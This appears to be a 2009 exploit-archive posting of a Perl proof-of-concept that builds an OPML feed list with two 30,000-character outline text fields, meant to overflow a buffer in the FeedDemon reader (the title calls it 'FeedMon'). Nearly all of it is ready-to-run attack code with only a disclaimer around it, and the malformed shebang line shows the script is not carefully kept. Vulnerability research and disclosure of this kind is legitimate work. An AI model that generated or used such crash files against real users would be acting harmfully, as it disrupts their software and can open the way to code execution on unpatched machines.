<html><head><title>FeedMon 2.7.0.0 outline Tag Buffer Overflow Exploit PoC</title></head><pre>#!usr/bin/perl -w

################################################################################
#     Reference:
#        http://security.bkis.vn/?p=329
#        http://www.securityfocus.com/bid/33630/info
#
#    Tested on Windows Server 2003 with FeedMon 2.7.0.0. FeedMon crashes
#    whenever I am trying to Unsubscribe from the malicious(overlylong) feed.
#
#     Thanx to milw0rm, str0ke, security.bkis, @rp m@n, evilfingers
#    and all security researchers.
#
#$$$$$ This was strictly written for educational purpose. Use it at
#$$$$$ your own risk. Author will not bare any responsibility for any
#$$$$$ damages watsoever.
#
#####MOST OF THE CODE I GOT FROM###############################################
#####http://search.cpan.org/~madghoul/XML-OPML-0.26/OPML.pm####################
#
#    Author: Praveen Dar$hanam
#    Visit:
#        http://www.darshanams.blogspot.com/
#        http://www.evilfingers.com/
################################################################################

use XML::OPML;
print &quot;OPML is working fine\n\n&quot;;

 my $opml = new XML::OPML(version =&gt; &quot;1.1&quot;);

 $opml-&gt;head(
             title =&gt; 'FeedDemon \'outline\' Tag Buffer Overflow Vulnerability PoC',
             dateCreated =&gt; 'Thur, 05 Feb 2009 8.55:35:00 IST',
             ownerName =&gt; 'Praveen Darshanam',
             ownerEmail =&gt; 'praveen_recker@sify.com',
             expansionState =&gt; '',
             vertScrollState =&gt; '',
             windowTop =&gt; '',
             windowLeft =&gt; '',
             windowBottom =&gt; '',
             windowRight =&gt; '',
           );

 $buff=&quot;D&quot; x 30000;
 # Malicious buffer which creates overly long text tag

 $opml-&gt;add_outline(
                 description =&gt; 'Warren Ellis\' Personal Weblog',
                 title =&gt; 'Warren Ellis Speaks Clever',
                 text =&gt; $buff,
                 type =&gt; 'rss',
                 version =&gt; 'RSS',
                 htmlUrl =&gt; 'http://www.diepunyhumans.com ',
                 xmlUrl =&gt; 'http://www.diepunyhumans.com/index.rdf ',
               );

 $opml-&gt;add_outline(
                 descriptions =&gt; 'The raelity bytes weblog.',
                 title =&gt; 'raelity bytes',
                 text =&gt; $buff,
                 type =&gt; 'rss',
                 version =&gt; 'RSS',
                 htmlUrl =&gt; 'http://www.raelity.org ',
                 xmlUrl =&gt; 'http://www.raelity.org/index.rss10 ',
               );

 $opml-&gt;save('malicious_files.opml');

# milw0rm.com [2009-02-05]</pre></html>